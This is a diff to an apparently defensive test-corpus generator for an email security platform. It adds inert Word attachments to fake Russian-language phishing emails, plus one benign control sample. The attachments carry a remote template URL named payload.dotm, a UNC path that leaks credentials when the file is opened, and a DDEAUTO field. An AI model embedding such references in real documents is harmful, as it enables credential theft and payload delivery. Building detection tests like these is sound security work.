@@ -289,6 +289,54 @@ class _Case:
     raw: bytes
 
 
+def _ooxml(
+    *,
+    template: str = "",
+    hyperlink: str = "",
+    unc: str = "",
+    dde: bool = False,
+    macro: bool = False,
+) -> bytes:
+    """A minimal, inert OOXML document carrying the references under test.
+
+    Hand-built rather than taken from a real document: the fixture must contain exactly the
+    structure being measured and nothing else, and it must be safe to open in a repository.
+    """
+    rels: list[str] = []
+    if template:
+        rels.append(
+            '<Relationship Id="rT" Type="http://schemas.openxmlformats.org/officeDocument/'
+            f'2006/relationships/attachedTemplate" Target="{template}" TargetMode="External"/>'
+        )
+    if hyperlink:
+        rels.append(
+            '<Relationship Id="rH" Type="http://schemas.openxmlformats.org/officeDocument/'
+            f'2006/relationships/hyperlink" Target="{hyperlink}" TargetMode="External"/>'
+        )
+    if unc:
+        rels.append(
+            '<Relationship Id="rU" Type="http://schemas.openxmlformats.org/officeDocument/'
+            f'2006/relationships/image" Target="{unc}" TargetMode="External"/>'
+        )
+    body = (
+        "<w:document><w:body><w:p>DDEAUTO</w:p></w:body></w:document>"
+        if dde
+        else ("<w:document><w:body><w:p/></w:body></w:document>")
+    )
+    entries = [
+        ("[Content_Types].xml", b"<Types/>"),
+        ("word/document.xml", body.encode()),
+        ("word/settings.xml", b"<w:settings/>"),
+        (
+            "word/_rels/settings.xml.rels",
+            ("<Relationships>" + "".join(rels) + "</Relationships>").encode(),
+        ),
+    ]
+    if macro:
+        entries.append(("word/vbaProject.bin", bytes([0]) + b"inert"))
+    return _zip(entries)
+
+
 # ---------------------------------------------------------------------------------------------
 # Generator
 # ---------------------------------------------------------------------------------------------
@@ -892,6 +940,119 @@ class GoldenCorpusBuilder:
                 notes="Известный пробел GAP-002: QR-коды не декодируются.",
             )
 
+    def _document_references(self) -> None:
+        """Documents that fetch something when opened (ТЗ 1.0.3 §39).
+
+        These carry no macro and no payload. Every macro-oriented check passes them, which is
+        exactly why they belong in the corpus: they measure whether the platform looks at what
+        a document *refers to*, not only at what it contains.
+        """
+        self._add(
+            "DOC-001",
+            DatasetCategory.MALICIOUS_ATTACHMENT,
+            _build(
+                subject="Акт сверки за сентябрь",
+                from_addr="documents@partner-docs.test",
+                from_name="Документооборот",
+                to=f"buh@{CORP}",
+                text="Во вложении акт сверки. Просьба подписать.",
+                attachments=[
+                    (
+                        "akt.docx",
+                        _ooxml(template="https://template-cdn.test/payload.dotm"),
+                        "application/vnd.openxmlformats-officedocument.wordprocessingml.document",
+                    )
+                ],
+                auth="spf=fail; dkim=none; dmarc=fail",
+                source_host="mx.partner-docs.test",
+                source_ip="198.51.100.71",
+            ),
+            RiskLevel.HIGH_RISK,
+            expected_rules=["ATT-040"],
+            scenarios=["THR-ATT-003"],
+            labels=["remote_template"],
+            notes="Удалённый шаблон загружается при открытии; макросов в документе нет.",
+        )
+        self._add(
+            "DOC-002",
+            DatasetCategory.MALICIOUS_ATTACHMENT,
+            _build(
+                subject="Договор на согласование",
+                from_addr="legal@contracts-sign.test",
+                from_name="Юридический отдел",
+                to=f"buh@{CORP}",
+                text="Договор во вложении.",
+                attachments=[
+                    (
+                        "dogovor.docx",
+                        _ooxml(unc=r"\\198.51.100.72\share\pixel.png"),
+                        "application/vnd.openxmlformats-officedocument.wordprocessingml.document",
+                    )
+                ],
+                auth="spf=fail; dkim=none; dmarc=fail",
+                source_host="mx.contracts-sign.test",
+                source_ip="198.51.100.72",
+            ),
+            RiskLevel.HIGH_RISK,
+            expected_rules=["ATT-041"],
+            scenarios=["THR-ATT-003"],
+            labels=["unc_reference"],
+            notes="UNC-ссылка: учётные данные уходят при открытии файла.",
+        )
+        self._add(
+            "DOC-003",
+            DatasetCategory.MALICIOUS_ATTACHMENT,
+            _build(
+                subject="Счёт на оплату",
+                from_addr="billing@invoice-dde.test",
+                from_name="Бухгалтерия поставщика",
+                to=f"buh@{CORP}",
+                text="Счёт во вложении.",
+                attachments=[
+                    (
+                        "schet.docx",
+                        _ooxml(dde=True, hyperlink="https://invoice-dde.test/pay"),
+                        "application/vnd.openxmlformats-officedocument.wordprocessingml.document",
+                    )
+                ],
+                auth="spf=fail; dkim=none; dmarc=fail",
+                source_host="mx.invoice-dde.test",
+                source_ip="198.51.100.73",
+            ),
+            RiskLevel.HIGH_RISK,
+            expected_rules=["ATT-042"],
+            scenarios=["THR-ATT-003"],
+            labels=["dde_field"],
+        )
+        # The benign counterpart: an internal document with an ordinary internal hyperlink must
+        # not be flagged. Without this the three cases above could be "passed" by a rule that
+        # simply distrusts every .docx.
+        self._add(
+            "DOC-010",
+            DatasetCategory.LEGITIMATE,
+            _build(
+                subject="Регламент согласования договоров",
+                from_addr=f"hr@{CORP}",
+                from_name="Отдел кадров",
+                to=f"buh@{CORP}",
+                text="Во вложении обновлённый регламент.",
+                attachments=[
+                    (
+                        "reglament.docx",
+                        _ooxml(hyperlink=f"https://portal.{CORP}/reglament"),
+                        "application/vnd.openxmlformats-officedocument.wordprocessingml.document",
+                    )
+                ],
+                auth="spf=pass; dkim=pass; dmarc=pass",
+                source_host=f"mail.{CORP}",
+                source_ip="10.10.0.25",
+            ),
+            RiskLevel.LOW_RISK,
+            forbidden_rules=["ATT-040", "ATT-041", "ATT-042", "ATT-043"],
+            labels=["internal_document"],
+            notes="Внутренний документ со ссылкой на корпоративный портал — не повод для сигнала.",
+        )
+
     def _internal_abuse(self) -> None:
         """Misuse from inside: a real internal account asking for something it should not."""
         bodies = [
@@ -1456,6 +1617,7 @@ class GoldenCorpusBuilder:
         self._credential_theft()
         self._html_smuggling()
         self._qr_phishing()
+        self._document_references()
         self._internal_abuse()
         self._lookalike()
         self._malicious_attachment()
